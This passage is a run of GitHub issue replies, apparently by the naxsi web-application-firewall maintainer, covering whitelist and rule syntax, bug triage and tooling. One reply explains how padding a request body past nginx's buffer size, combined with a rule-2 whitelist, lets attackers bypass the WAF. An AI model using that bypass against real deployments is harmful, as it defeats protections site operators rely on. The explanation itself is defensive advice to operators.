its way to master for 0.56 :)\n. @ManuelRighi : can you provide extra info ? :D. should be now ok (99fe81c)\n. hi guys,\nI pushed a fix that should avoid this, aborting if mutually exclusive options are present.\nplease re-open if it doesn't fix the issue\n. changed, thanks ;)\n. Hello,\nCan you provide me more detals on how you triggered this error ? I think it should only happen if :\n- you have a lot of whitelists\n- you have incorrect whitelists that make hashtable build fail\nIf you could provide your configuration, it would probably help a lot :)\ncheers,\n. yes, this will solve the issue, but I'm afraid that your way of generating whitelists is a bit optimistic, and you might end up allowing dangerous things :)\n. Hi,\nthanks for the notice, didn't try yet.\nI'll try to get my hands on ES 2.X to fix the issue.\nBut this lack of backward compat is pretty annoying from them, they did the same between 0.9 and 1.X iirc.\n. Hi,\nYes thank you for the report, I'm aware of that.\nI'll try to get my hands on an ES 2.X instance any time soon and fix it .. really wish I can close this in the coming days, it's going to become a problem soon :)\n. Dude, I don't know you, but I love you :)\nGoing to give it a try this week-end, and branch it.\n. thanks again, seems to work :+1: \nClosing issue until someone complains patch isn't working ;)\n. do you believe I actually updated the signature ? :D\nSorry for the delay, I totally forgot about this.\nClosing issue so that I see it if it happens again\n. Not an issue, provide details please\n. Hi,\nNo, definitely not \"necessary\", but it might allow you to get better protection, ie. in case naxsi or mod_security would be bypassed. However, security is about paranoia, isn't it ?\n. I don't think is \"a problem\" nor \"an error\", just naxsi doing what he is asked to ?\n. Please provide details : At least make it so that I don't have to scratch my head understanding what you actually mean :)\n. Can you provide a reproducible test case ? Because this kind of case should be covered by naxsi and is part of unit tests : t/01naxsi_whitelists.t\nie. provide config + request\n. Hi,\nI guess you should use  BasicRule wl:4201 \"mz:ARGS|NAME\"; for the whitelist.\nSimply BasicRule wl:XX does not seem to apply in |NAME zone, I'm self opening issue :)\n. Whitelist it as any other rule ? Or I misunderstood your question ?\n. ?\nPlease, keep the issue concise and factual, it's not a forum :p\nIf you want to discuss etc. go on irc #naxsi on freenode, thanks.\n. Hi,\nsure, you can reach me here : bui@nbs-system.com\n. TY :)\n. Hi,\nI think you regex's wrong :p\n^[[]a-z_0-9-]+$ instead of ^[[]a-z_-]+$ would do the trick no ? \n. Closing, because I think it's linked to that, please re-open if it's not :)\n. Hi,\nI need to double-check but afaik it's a limitation in nginx (naxsi relies on nginx's api for that)\n. Hi,\nYou can as well use $naxsi_extensive_log to get more info ;)\n. Hi,\nPlease see branch naxsi-loadable :\nhttps://github.com/nbs-system/naxsi/tree/naxsi-loadable\nTell me if you see any issues.\n. has been merged in master ;)\n. Hi,\nfirst of all nx_util.py is deprecated, so you might want to use nxtool instead (but nx_util might still do the job for you).\nid:2 is when the request is bigger than the max_body_size defined by nginx and thus the file is buffered to disk. Naxsi does not in any case parse files buffered on disks, and block them by default.\nWhitelisting id:2 while creating a potentially dangerous bypass shall work.\nPlease provide a way to reproduce your error.\n. thanks\n. Hi,\nIn your compilation options I don't see naxsi as a dynamic module.\nSee : https://github.com/nbs-system/naxsi/blob/master/naxsi_src/Makefile#L25\n. thank you very much\n. Hi, Just saw your comment on the google form and now the PR :)\nThanks a lot, going to have a look at it, it's definitely a good idea !\n. Hi, I just looked at the code, and it seems pretty cool to me.\nWould you mind adding some unit test ? (see t/*.t)\nI planned on releasing 0.55 soon (next week?), I think it's better to merge after the release, so that I/we can test/extend it internally before making it upstream. Now that nginx supports dynamic modules, we can do releases more often :)\nCool for you ?\n. Seems ok to me at first sight, but tbh I didn't really look deep into it.\nI will look at it after 0.55 release ;)\n. Hey,\nDefinitely 100% interested into it, it's a great feature.\nWe are still in the process of pushing 0.55 :\n- [x] minor bugfixes\n- [x] more bugfixes\n- [x] improved matchzone system for better signature/vpatches\n- [x] new libinjection integration\nPlease do update the PR if you can :)\n. Hello,\n0.55 has been released, I'm going to merge this along the road to 0.56, @marcelomd any addition you would like to make ?\n. @marcelomd : I commented on #388. Let's make it optional for the user (either via dynamic var or configuration directive - I guess the first one offers more flexibility at little cost) and we are good to go.\nAfter the changes are good and reviewed, I guess we can merge the other and close this one ? :)\n. Closing this one as it overlaps #388, will re-open if there is any issue with the enhanced version :). Please provide more information for us to reproduce the bug.\nrequest / expected response / NAXSI_FMT.\n. Yes, you should be able to, can you give more context about the issues you are facing ?\n. Please take a look at the wiki ... \nhttps://github.com/nbs-system/naxsi/wiki/deniedurl\n. yes it works if it's MainRules inside.\n. thanks :)\n. oh thank you very much for the report and the bugfix.\nI can't check it myself this week, but I'll give you a feedback next week, and properly merge it :)\n. Your fix works perfectly.\nDo you want me to patch it, or do you prefer to do a MR ?\n. Hi, Can you provide a way to reproduce it ?\nI'm not sure which case you refer to, but I think it might \"seem\" swapped, but it's because the exception happened in the name of the variable, rather than the content, thus the switch. (I don't know if it's clear, but it is entended)\n. nice, didn't see it didn't work with some 2.6 versions :)\n. Hi,\nsorry for slight delays, I was out :)\nLet me come back to you on this topic quickly\n. actually for this specific issue, I prefer to stick with the current behavior (trying to decode even in mutlipart), and accept the false positive, it might create a risk if developpers actually expect the things to be url encoded.\n. I'm closing the issue, if you think (besides the fault positive) it might have implications, feel free to re-open it :)\n. yes, it would be a much needed change, but I didn't find a clean/cool way to do so without breaking backward compat, I'm open to suggestions :)\n. @jvoisin YOU ARE NOT ALLOWED TO VOTE ON THIS ISSUE !!!\njk actually that a smart suggestion @markussackmann :)\n. I will try to make it happen for 0.56 with configuration parsing rewrite :)\n. Hi,\nThose are passed via HTTP headers, please see : \nhttps://github.com/nbs-system/naxsi/wiki/deniedurl\nlet me know if it doesn't fit your needs :)\n. Yep, your suggestion seems legit, and I don't know why we are not restoring this way already :)\n. I think I'm actually going to stick with your suggestion :\nd++ = '%'; d++ = (s - 2); d++ = *(s - 1);\n. I think it's not an issue, it's not related to naxsi :)\n. Hello,\nthank you for this detailed issue, I'm trying to have a look at it soon (hopefully this week)\nBest regards,\n. Thanks, closing issue\n. Nice one, thanks :)\n. please see : https://forum.nginx.org/read.php?2,266443\n. Hello,\nI'm investigating a similar issue, I'll keep you posted as soon as I have something :)\n. Hi,\nThere is actually a WIP in order to allow mainrule(s) to be more precise, ie. do things as you want to do. So far, the _X system was mostly designed for whitelists.\n. Hey,\nCan you confirm https://github.com/nbs-system/naxsi/tree/improved-blacklist-matchzones works for you ?\ncheers,\n. I'm going to try to fix that !\nstay tuned, keep the issue warm :D\n. and by the way, you can now even write blacklists like :\nMainRule id:X str:foobar \"mz:$URL_X:^/foo[0-9]+$|$ARGS_VAR_X:^rtututu$\";\n(check only if url matches ^/foo[0-9]+$ AND the args name matches ^rtututu$)\n. Should be fixed now, can you tell me if it's good for you ?\nActually, it might even (very very slightly) improve things, as this bug allowed to point out that sometimes rules were pushed twice (and thus checked twice at runtime).\n. Ok, I'm thus closing this issue :)\nI guess the other issue you opened (about the rule 1015) is a side-effect of this patch :)\n. Hello,\nI'm not sure to understand the problem :\n- if I enable $naxsi_extensive_log, I do get the NAXSI_EXLOG.\n- Without extensive log (and in learning mode), one hit on 1015 isn't enough to trigger a block, so it wouldn't be logged.\nthanks,\n. ah ok, thanks for the notice :)\nI'll get a quick look and keep you posted, hopefully today !\n. Hello,\nSorry, but I didn't managed to reproduce the bug, can you provide some kind of reproducible test case ?\n. Don't worry and thank you for reporting :)\n. Hello !\nI believe this was fixed after https://github.com/nbs-system/naxsi/issues/263 thank to @aiwilliams :)\nMight you pull 0.55rc1 (current candidate) and confirm you still get the issue ?\n. ah thank you :)\nwould you mind opening a pull request ?\n. As well integrated enhanced libinjection support to be used as virtual patching :\nMainRule \"d:libinj_xss\" \"s:DROP\" \"mz:$ARGS_VAR:ruuu\" id:41231;\nMainRule \"d:libinj_sql\" \"s:$FOOBAR:8\" \"mz:$ARGS_VAR_X:^fuu[0-9]+$|$URL_X:^/foobar/$\" id:41231;\n. thank you @lwh :)\n. fsanitize bringed too much trouble to integrate in tests suite right now, but i'm working on valgrind integration :)\n. ping @blotus for merge :)\n. ping @blotus \n. Hello !\nI'm going to look at this probably next week.\nHowever, I want to point out how exemplary this issue is :)\nThanks !\n. Hello,\nAt first glance, while it's probably a bug, it's not surprising.\nFrom my understanding with http2 (and that's the reason behind the original crashes), \"common\" header names are stored by nginx in r/o memory (the original SEGV was caused by an attempt to lower-case incoming header's name iirc). Naxsi being case insensitive, I'm not really surprised by this issue. I'll keep you posted on this one.\n. Hello,\nSorry for the delay :)\nI pushed to http2 branch a fix that should adress this (and #227) in a better way.\n@marcelomd : can you confirm the fix ?\ncheers,\n. thanks @Doemela for helping ;)\n. Hello,\nthanks for the suggestion, we are rewritting nxtool and will take this into account :)\ncheers !\n. Hello,\n1. replaced \"index\" : \"nxapi\" with \"index\" : \"123.json\"\nI think you mean \"index\" : \"123\" ?\n. Are you using nxtool to inject data into ES ? I always used the default index myself :)\nIf it is the case I can reproduce it and try out !\n. Hello, can you check from master now ?  #e2265e6 should address the issue :)\n. ping @sous-studio :)\n. closing, @sous-studio feel free to re-open if you have time to check this :)\n. You referring to this ? https://github.com/nbs-system/naxsi/wiki/A-fail2ban-profile-for-Naxsi\nIf so, you are right, this was written before the learning flag was included within NAXSI_FMT :)\n. I'm editing the wiki page (btw notice ! new wiki) and closing.\n@Doemela don't hesitate to edit the wiki directly, it's open for edit on purpose :)\n. Hi,\nprovide ? nope\ncan naxsi be built and used as a dynamic module ? yes (confirmed with 0.54 & later)\n. thanks @Doemela for answering these ones :)\nI'm closing the issue as it is solved.\n@zzhclare : when you have issues related to naxsi-rules repository, would you mind opening those in the naxsi-rules project ? the dev team has very little/no real involvment into those :)\ncheers !\n. Hello, (regarding your last question)\nFor me it seems to be working (from master).\nfrom naxsi_src:\nmake re\nin /tmp/naxsi_ut/nginx.conf :\nlocation / {\n  BasicRule \"str:https://hostname.domain.tld\" \"msg:this is my origin header\" \"mz:$HEADERS_VAR:origin\" \"s:DROP\" id:3211;\n   LearningMode;\ncurl -H \"origin: https://hostname.domain.tld\"  127.0.0.1:4242/azaaa\n2016/07/26 09:52:29 [error] 3680#0: *1 NAXSI_FMT: ip=127.0.0.1&server=127.0.0.1&uri=/azaaa&learning=1&vers=0.55rc2&total_processed=1&total_blocked=1&block=0&zone0=HEADERS&id0=3211&var_name0=origin, client: 127.0.0.1, server: localhost, request: \"GET /azaaa HTTP/1.1\", host: \"127.0.0.1:4242\"\n. Regarding your first question :\nBasicRule negative \"str:foor\" \"mz:$HEADERS_VAR:header1|$URL:/foobar\" \"s:DROP\" id:4241;\nBasicRule negative \"str:bar\" \"mz:$HEADERS_VAR:header2|$URL:/foobar\" \"s:DROP\" id:4242;\n1 blocked  ('foor' is not found, thus rule 4241 matches)\n$ curl -I --Header \"header1: foo\" http://127.0.0.1:4242/foobar\nHTTP/1.1 418\n2 not blocked (no rule applies to head3)\n$ curl -I --Header \"header3: anything\" http://127.0.0.1:4242/foobar\nHTTP/1.1 404 Not Found\n. Hello,\nI never came accross this issue, and there shouldn't be a difference between named locations and normal locations imho. However, due to the return (which I think actually triggers an internal redirect) naxsi might ignore this, because it explictely avoid treating internal redirected requests (because of some specific cases we came accross in the past).\nRight now I don't have any appropriate suggestion to give, but dynamic modifiers might help. They do work at http {} level (https://github.com/buixor/naxsi/wiki/runtime-modifiers)\nhttp {\nif (randomstuff) { set $naxsi_flag_enable 1; }\nlocation / {\n}\nPlease let me know :)\n. It might be something we think about in the future, but right now I can't evaluate the implications :)\n. nginx enforces a hardlimit of 4k on logs, topic is silently discarded for now :>\n. Hello,\nI didn't manage to reproduce it.\nCan you provide a bit more details ? (I just tried from a fresh install and it seems to run)\n. closing without reply, don't hesitate to re-open @cryptofuture if you can reproduce and/or have extra info :)\n. Hello,\nI think we will take inspiration for this and add it to @marcelomd PR.\nAllow user to export the NAXSI_FMT content in a variable, so it can be used in nginx's log_format.\nI guess it would fit both requirement while limiting unnecessary code :)\n. Hello,\nI don't think I'll be down the naxsi_log_format directive right now, and stick to @marcelomd approach which will be more extensive. However, I will give a look at nginx's log_format mechanism to see if we can re-use it. The later approach won't come before 0.57 I think ( while @marcelomd's PR should land in 0.56)\n. thanks @Montano5 for the info !\n. soon soon ! :D\n. Hi,\nPlease look at : \nhttps://github.com/nbs-system/naxsi/wiki/rules-examples#blocking-dangerous-directories\n. hey :)\nThanks for the MR, but I'd like to limit alloc/string copies in a piece of code that is called that often.\nI'd keep this one at hand, because, while it seems to work, I hope we can find a \"cheaper\" way ;p\n. and I thank you a lot for that ;)\n. Mh I didn't had much time to properly work on the topic, but so far I didn't see any better alternatives :/\n. The warning will be thrown once at the first request that hits the internal location.\nI could do this at every request, but it's - at most - just a clever way to fill up logs ?\nSadly, we can't do it at config time :/ \n. Naxsi will simply not treat a request that is tagged as \"internal\" (because of re-entrant aspect of nginx).\nSo it means the admin must configure naxsi so that the request is processed before the request is tagged as internal. It might be changed in the future to allow an admin to specifically allow this behavior. For now, we just want to throw a warning in the logs.\n. Commited a fix attempt a548d60 let's see :)\n. Hello,\nIt is the expected behaviour :) Naxsi doesn't know (yet?) how to parse xml, so it fires unknown content-type internal rule\n. Hello,\nIt seems that the compile error is not within naxsi (or does not refers to it), can you double check that the same versions of ndk & lua with naxsi 0.54 and same nginx's version throws the error ?\n. Hello,\nYou are right the problem is within naxsi, apparently due to the dual support for dynamic modules / built-in. We are pushing a fix soon and pinging you :)\n. Hello,\nproperly some inconsistency in nxapi's date parsing. Can you show me some raw log format (especially the date part).\ncheers,\n. Hello,\nCan you provide me with the full log line and the associate dict so I can reproduce ?\nFrom what I see, it is probably a time-zone parsing issues, because the library we use in python doesn't handle the +X in the time form.\nCheers,\n. Hello,\nSorry, I really mean one line of log, with the associated / resulting json document in kibana.\n. Hello,\nDo you have any sample data that could help me reproduce the bug ?\nRegards,\n. Hello,\nfrom your naxsi log it seems that it's normal it doesn't work :\nBasicRule wl:0 \"mz:BODY|$URL:/user/update\";\nYour rule targets \"/user/update\" but your url is /user/update/1140805 you should use regular expressions\n. Hello,\nSorry for delay :)\nPlease look at the whitelist/rules syntax, you need to use the $\u2026_X syntax if you want to use regex in mz.\n. You didn't read my answer, did you ? :)\nWhat I mean is that you need to write your rule so that naxsi knows it's a regular expression :\nBasicRule wl:0 \"mz:BODY|$URL_X:^/user/update/\";\nBut I think it's quite dangerous to do so, and should be kept for very specific use-case, as it opens a wide breach in filtering.\n. we are relying on coverity for source code audit; and playing with afl for fuzzing :). Hello @selivan,\nIf I understand correctly you really want to strip out all the variables that would not be specified by the naxsi_allowed_headers/naxsi_allowed_get_args etc?\n. Hello,\nWe will consider, however, it would require really altering the incoming request, which has quite a lot of implications. Thanks for the idea anyway :)\n. Hello,\nIt will be merged in for 0.56, which should be in the coming months.\nHowever, some users are actively using http2, and did not report issues.. Such Impatience :D Just kidding, I'm trying to book some time to work on naxsi in the upcoming weeks, I have a few extra issues to deal with before the merge.\n. Hello,\nCan you confirm you are not in 0.55 ? for me this one was fixed in 0.55 :)\ncheers,\n. Ok, I'm going to add a unit test to check for this bug, I'll come back to you.\nThis was a known bug, but supposedly fixed in 0.55 . hello,\nI added a unit test, and it seems to pass for me.\nCan you confirm it reproduces the bug on your side ?\nIf you have source code, simply make re test from naxsi_src, it will download & compile nginx in /tmp/ and run unit tests.\ncheers,\n. Ok so seems the bug is not that easy to reproduce. Can you keep me posted if you happen to find a log that triggered it ?\n. Hello,\nYou need to make your rules lowercase, like :\nBasicRule wl:2 \"mz:$URL:/microsoft-server-activesync|BODY\" ;\nCan you confirm if it's working ?\n. Hello,\nRule 2 is this : https://github.com/nbs-system/naxsi/wiki/internal-rules#big_request\nmeans it applies to the whole body (body is too big, nginx decides to buffer it on disk), it makes little sense to apply it to one post variable :)\nThus you need to disable for a full uri at least.\nIs it more clear like this ?\n. Hello,\nI think this is quite a dangerous idea, bear with me :\n * Rule 2 fully disable naxsi when whitelisted on a specific scope (as the body is not parsed while stored on the disk)\n * Attackers add \"Cmd=SendMail\" in body, adds a lot of padding (to overflow \"client_body_buffer_size\" and thus bypass the WAF)\n * Profit\nI don't know how big is the body, but you can increase \"client_body_buffer_size\" to be big enough so that it doesn't trigger the rule n\u00b0 2. On the other hand, I think it's a lot less dangerous to whitelist rule n\u00b02 on a specific url.\nIf you can provide more details, maybe we can find a smarter work-around ?\nCheers,\n. Mh I understand, and I'm afraid you hit a roadblock :\n * We can do some nasty tricks using (https://github.com/nbs-system/naxsi/wiki/olds-dynamicmodifiers) to disable naxsi at runtime if some specific criterias are met : Unfortunately, this would probably be a performance killer, because it implies that nginx will live parse a lot of data.\n * The initial suggested solution doesn't seem satisfying in your usage neither.\nI'm going to think a bit about it, but I don't see any satisfying solution right now. Any reasonable discussion might rely on the capacity of naxsi to parse buffered files on the disk, solution that is not ready yet :/\n. Please let me know what solution you end up with, it might be useful to others ;)\n. Thanks @s8sg !. Hello,\nCan you try from master ? thank @s8sg . Hello,\nThanks for the MR :)\nWould you mind making the ES5 flag being read from the configuration file ?\nBest regards,\n. Sounds cool :)\nIf the elasticsearch-py can query it, it would be awesome, can you check that ?\nIt would allow to merge blindly !\ncheers,\n. awesome, thank you very much :)\nIn the meanwhile, do you want to give a try at the new nxtool version? \nWe are going to switch to this one soon.. Hello,\nwhich version of ES are you using ?. Hello,\nCan you try from master ? thank @s8sg . should be good from master . We don't provide dashboard for kibana5, sorry.\nIf you want to add a wiki article, you are welcome :). We're all good \\o/\n. you are welcome !\nAs you are using regex, I suggest using '$' at the of your regex to avoid bypass ;)\n. @hahahaha0o1 would you mind closing the issue if the anwsers satisfies you ?\nthanks @C0nw0nk :)\n. According to debuggex, the rule shall match, \\w matches any word character (equal to [a-zA-Z0-9_]). Yes, I'm thinking of at least adding the new rule in 0.56, and we'll see later if we can safely remove the \"old\" one :). thanks @he2ss . Hello,\nnot sure to exactly get what you are trying to achieve, but regarding this :\nMainRule negative \"rx:\\.(html|php)\" \"msg:Block access to any URL format other than those whitelisted\" \"mz:URL\" \"s:$UWA:8\" id:1600;\nif you don't want this to allow .php5 or .htmlsomething, you can just change it like this :\nMainRule negative \"rx:\\.(html|php)$\" \"msg:Block access to any URL format other than those whitelisted\" \"mz:URL\" \"s:$UWA:8\" id:1600;. It shouldn't match /url.html?stuff&morestuff=etc or /url.php?stuff&morestuff=extrastuff&stuffing but it won't block probing :/. URL is different from GET args. URL stops before \"?\"\n. \"rx:^/[a-z/]+/$\" should work :) starts with a slash, ends with a slash, is composed of a-z. For this kind of things, I think it's better to keep separate rules :)\nYou could do it in one rule, but it's more regex related.\n. Hello,\nAfaik, you can't because of the way modules are built and used for nginx. modular version doesn't require any modification in the code, so it's not really apache-style modules. Thus I think you have a hard dependency on the major/minor nginx version :)\n. I think you forgot to include your naxsi_core.rules :). https://github.com/nbs-system/naxsi/wiki/olds-faq. Hello,\n@ciarans : if you do the same without naxsi, does it work ?\nDidn't try myself, but I can give it a shot :)\n. Closing, @ciarans : re-open if you still encounter the issue :)\n. Hello,\nDoing a negative rule should do the trick :\nhttps://github.com/nbs-system/naxsi/wiki/rules-examples#negative-rule\n. Hello,\nNaxsi will process headers and URI for HEAD methods [1] :)\nHowever, naxsi does not offer any way to filter the HTTP VERB used, so I'm afraid you will have to stick to your nginx trick for now.\n[1]\nMainRule \"id:4241\" negative \"s:DROP\" \"rx:^/rest/\" \"mz:URL\";\n$ curl -I localhost:4242/zzz/\nHTTP/1.1 512\nMainRule \"id:4242\"  \"s:DROP\" \"rx:lololol\" \"mz:HEADERS\";\n$ curl -I -H \"foo: lololol\" localhost:4242/rest/\nHTTP/1.1 512\n. Hello,\nFrom :\n2017/02/10 22:27:35 [error] 1979#0: *187 NAXSI_FMT: ip=MY_IP&server=MY_WEBSITE&uri=/admin/reports/updates/update&learning=0&vers=0.55&total_processed=181&total_blocked=3&block=1&cscore0=$XSS&score0=8&zone0=BODY|NAME&id0=1310&var_name0=projects[ctools]&zone1=BODY|NAME&id1=1311&var_name1=projects[ctools], client: MY_IP, server: MY_WEBSITE, request: \"POST /admin/reports/updates/update HTTP/1.1\", host: \"MY_WEBSITE\", referrer: \"https://MY_WEBSITE/admin/reports/updates/update\"\nYou should whitelist 1310 and 1311 in BODY|NAME (and here, specifically on the URL of your exception):\nBasicRule wl:1310,1311 \"mz:$URL:/admin/reports/updates/update|BODY|NAME\";\nYou can find more info on how it works here :\nhttps://github.com/nbs-system/naxsi/wiki/whitelists-bnf\nRe-open if you're facing issues :). What do you want to do ? :)\n. Hello,\n\nPossible that my installation and configuration has been destroyed for having launched a ubuntu update? \n\nyes I think your nginx was upgraded, but to a version without naxsi. But your config should still be here :)\nYes, you will need to recompile it, or get a package from someone :). hi @CogumelosMaravilha :)\nActually, you can do both, by using LearningMode + BLOCK & DROP :\n * LearningMode + BLOCK would juste log\n * DROP drops the request even in learning mode\nOverall, the idea is often to turn off the learning once you feel confident :)\nIf you use kibana+nxapi, you should see spikes if the last update of your website is triggering exceptions !\n. Yes, if you are using positive model but have no communication with developpers, it won't be easy to manage :) Best is to have naxsi on your Q&A env, so you can adjust the rules before migrating to production. Makefile itself is only used for unit tests, fuzzing, code coverage etc.\nIt's the config file in the naxsi_src/ directory that is used by nginx for compilation.\nSo for me that's out of our scope, and it would be fairely intrusive to try to push our compilation options ?\nThoughts ?\n. Yes, that sounds like a good idea :). Hello :)\nnxtool-ng (https://github.com/nbs-system/nxtool-ng) is supposed be able to work with flat files !\n. Ok, let me get back to you :)\nI'm closing this issue so we can handle it in nxtool repo's. Hello !\nYes, it seems naxsi breaks subrequests, but I didn't encounter it yet because we are not using it.\ncan you provide me a little test case so I can have a look ? I hope to get some time to work on this !\nregards and thanks for the detailed issues :). Hi,\nit seem that the naxsi does not take effect within the nginx internal subrequest?\n\nnginx: 1.10.1\nmodsecurity: 0.55.3\nnginx.conf:\n```nginx\nlocation /loc1 {\n   #SecRulesEnabled;\n   #DeniedUrl \"/50x.html\"; \n   #CheckRule \"$SQL >= 8\" BLOCK;\n   #CheckRule \"$RFI >= 8\" BLOCK;\n   #CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n   #CheckRule \"$EVADE >= 4\" BLOCK;\n   #CheckRule \"$XSS >= 8\" BLOCK;\n\ncontent_by_lua ' ngx.location.capture('/loc2')';\n}\nlocation /loc2 {\n   SecRulesEnabled;\n   DeniedUrl \"/50x.html\"; \n   CheckRule \"$SQL >= 8\" BLOCK;\n   CheckRule \"$RFI >= 8\" BLOCK;\n   CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n   CheckRule \"$EVADE >= 4\" BLOCK;\n   CheckRule \"$XSS >= 8\" BLOCK;\nproxy_pass http://192.168.0.11:8080$request_uri;\n}\n```\n\nenable naxsi SecRule in /loc1, the rules take effect.\ndisable SecRule in /loc1, only enable naxsi SecRule in /loc2, the rules have no effect. that is to say, the naxsi does not take effect in the nginx internal subrequest.\n\nAny good suggestions? Thanks!. Don't worry, I'm quite busy myself, and will be out of the internetz from next week till the end of the month :). Hello,\nThanks for the detailed informatiion :)\nI'll be on hollidays for two weeks with no internet, but I'll try to tackle this one when I come back !\nSo far, I have no plan for commercial support for naxsi as I'd like to keep free hands on it, but we can always discuss the matter depending on your needs, can you mail me ?\ncheers, . great, waiting for merge :). Hello,\nif you use regex-style expression, the whole match-zone must be in regex, see :\nhttps://github.com/nbs-system/naxsi/wiki/matchzones-bnf\n. Hello,\nBasicRule wl:1000 \"mz:$URL_X:regexp:/|$BODY_VAR_X:regex\";\nWould be the way :). Hello,\nYes, so far naxsi does not process any requests tag as internal, does content by lua enables this flag ?. Hello, merging with #364 if you don't mind. Hello,\nallow score aims at overriding other rules to force a pass action, but it should not be used for now, as it is not fully implemented.. see #374 :). Hello,\nIt is because you triggered an internal rule. Those do not set a specific named score, but just set the block flag in the request.\n. Nah, don't worry, doc is a bit slacky !. Fixed doc : https://github.com/nbs-system/naxsi/wiki/internal-rules\n. Hello,\nI'm happy to see your interest in this feature ;)\nThat's an ongoing work on my side, so you shall wait a bit, but if you want to collaborate on integration, don't hesitate !\n. Hello,\nYes, this is the price of a poor design decision, we hope to add a workaround in next version, but so far, you are stuck, sorry :(\n. see #271 \n. Looks like a great feature, can you provide some unit tests so I can review and play around ?\nThanks :+1: . Hello,\nDid you try performing learning on the logs ?\nHave a look as well to : https://github.com/nbs-system/naxsi-rules. Hello !\nin 2017/05/10 18:40:31 [error] 12357#0: *452 NAXSI_FMT: ip=xxx.xx.xxx.xxx&server=xx.xx.xxx.xx&uri=/conve the 452 is not naxsi ID, but nginx worker.\nYou IDs here are :\nid0=1009&id1=1016&id2=1302\nYou can always refer to :\nhttps://github.com/nbs-system/naxsi/wiki/internal-rules\nand naxsi_core.rules\n. Hello,\nI don't just want to allow \"mz:$BODY_VAR:scripts[]|NAME\", I want to allow \"mz:$URL:/|$BODY_VAR:infinity|$BODY_VAR:scripts[]|NAME\", but this results in the error\n\"mz:$URL:/|$BODY_VAR:scripts[]|NAME\" seems to be the correct syntax :)\nSo is there a way to target parameter names with square brackets only when the parameter ?infinity=scrolling is present? : unfortunately no :(\nIf you are running into trouble, please submit a naxsi_fmt :)\n. Hello,\nI didn't understand your question, can you rephrase ?\nRegards,\n. Hello,\nDid you called nxapi with --tag ?\nUsually, once you generated your whitelists, you can call\n$ nxtool.py -c ... -w /path/to-whitelists and you will see output such as :\n<lot of output>\nAVxXvcE0qJG0jumrWUti, AVxXvcrEqJG0jumrWU1R, AVxXvc78qJG0jumrWU4y, AVxXvdAyqJG0jumrWU8H, AVxXvdCsqJG0jumrWU8U, AVxXvdEMqJG0jumrWU8W, AVxXvdEMqJG0jumrWU8Y, AVxXvdIUqJG0jumrWU8k, AVxXvdOzqJG0jumrWU80, Tagged 13161 events out of 32156\nand if you call it again with --tag (in addition to the path to whitelists), it will actually update the events in elasticsearch to tag them as whitelisted, and this is what the whitelist(ing) ratio relies on.\nI hope it's more clear like that !\nAs well, feel free to update the wiki if you don't feel this is clear ;)\n. mh that's pretty weird and I have no idea why.\nwhat version(s) are you using ? (es / naxsi / nxapi etc.) . mmh I'm using a similar (2.4.1) version here, and I didn't encounter any issues :(\n. fixed by merrge. hello :)\n@sabban @dorogarcia : let's move the issue to https://github.com/nbs-system/nxtool-ng ;)\n. Commented on your MR ;)\n. Hello,\nI don't see any whitelists neither.\nCan you please use nxtool-ng ? nxapi should be considered as deprecated :D\n. Hello,\nI think having a challenge (ie. js) will be more efficient than trying to solve it with naxsi, as you might run into a endless cat/mouse game :)\nsomething like https://github.com/kyprizel/testcookie-nginx-module might help !\n. Hello,\nYes, nxtool-ng is a replacement of nxapi, and nxapi should soon disappear.\n@sabban : I guess we should clarify the documentation of nxtool-ng, especially now that it has implemented all the features of the old nxtool :). Hello,\nCan you provide example request ?\nAs well, it seems you didn't include naxsi in php location, which is probably where you need it !\n. thanks @jreisinger :). Sorry for the close without justification, was just doing some cleanup.\nIf you read a bit about naxsi, you will quickly see it's a whitelist based mecanism and without training it won't give any results. If you want OOB SQLi killer or things like this, it's probably not the tool you are looking for :). It seems to be a pcre issue no ?\n. Hello,\nSorry for the delay, I was busy working on snuffleupagus :)\nYou can whitelist the internal rule as any rule. However, by doing so, you will render naxsi completly blind of what is happening. Internal rules that drop request even in learning-mode means that naxsi usually cannot parse the request at all, and thus can't inspect it.\n. Hello,\nSorry for the delay :)\nNice to see you found a solution.\nWould you mind submitting a MR to integrate it upstream ?\n. Can you give an example of what you want to allow and what you want to disallow ?. If I understood you correctly, you want to allow a single IPv4 or IPv6 adress ?\nValidating this properly with a regex sounds a dangerous idea, but you might end up with something like this (untested ofc):\nBasicRule \"rx:^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}$|^[a-f0-9:]+$\" \"mz:$HEADERS_VAR:x-forwarded-for\" \"s:...\";\nHowever, please take my word and considerate this a bad idea, a quick google search will lead you to the fact that validating ipv6 (or even ipv4) addresses with regex is closer to rocket jump than anything else :)\n. Hello !\nSorry, the formatting was a bit hard to read so I might have missed some stuff.\nNaxsi purposely doesn't process requests in sub-requests and your case might end up being one (it lead to many corner-cases at the beginning).\nThis is something that will change with the next major evolution, but as of now it is a hard limit.\n. cool :). hello,\n@rmdashrfslash is right, wl:0 should whitelist all rules except the internal ones :)\nI guess this might be an issue in the config, or a bug.\nCan you provide minimal test case ?\ncheers,\n. Closing for now, just added a test-case for this and it seems to be working : https://github.com/nbs-system/naxsi/commit/7c8aa9cb296d5d0e7d822e3f9622cd39c1c86935\n. Hello,\nI guess you should use https://github.com/nbs-system/naxsi/wiki/runtime-modifiers\n. Hello,\nWe don't use ES6 yet. If you happen to make it work, we'll gladly review and merge MR ;)\n. Hello @Yooke  !\nBy default, learning-mode doesn't whitelist the internal rues (ids < 1000), you have to whitelist those explictely, as they usually mean that naxsi isn't able to parse the request and thus won't filter anything on the whitelisted scope :)\nSee : https://github.com/nbs-system/naxsi/wiki/internal-rules\ncheers !. Hello,\nIn your example, /etc/nginx/naxsi/basic/bla-whitelist.rules won't be included /etc/nginx/naxsi/*.rules.\nThat might be why the whitelist doesn't work\n. Please try to put all the configuration in the same file to see, but it really sounds  like this.\nOr else, can you please provide a reproducible usecase ?\ncheers,\n. yes ofc the tools coming with naxsi can work from flat logfiles as well :)\n. looks good to me :)\n. Hello,\nCan you provide more info on what happens, like logs ?\nThe only things that might be blocking in learning-mode are :\n - explicit black-list rules that use the DROP action\n - internal rules related to naxsi unability to parse incoming request\n. Hello,\n@edoz90 this one is a rather interesting one !\nI guess the simplest way would be to create a rule to match on the Content-Type header to restrict to the ones that nginx can internally properly decode (naxsi relies on nginx's internal url-decoding functions).\nIn your usecase, php is hosted by the nginx server itself ?\nCheers,\n. Hello,\nWe are mering a branch with a test-case for your report.\nThe automagic rule to drop this should be (drop every charset that is not utf-8) :\nMainRule \"rx:charset\\s*=\\s*(?!utf\\-8)\" 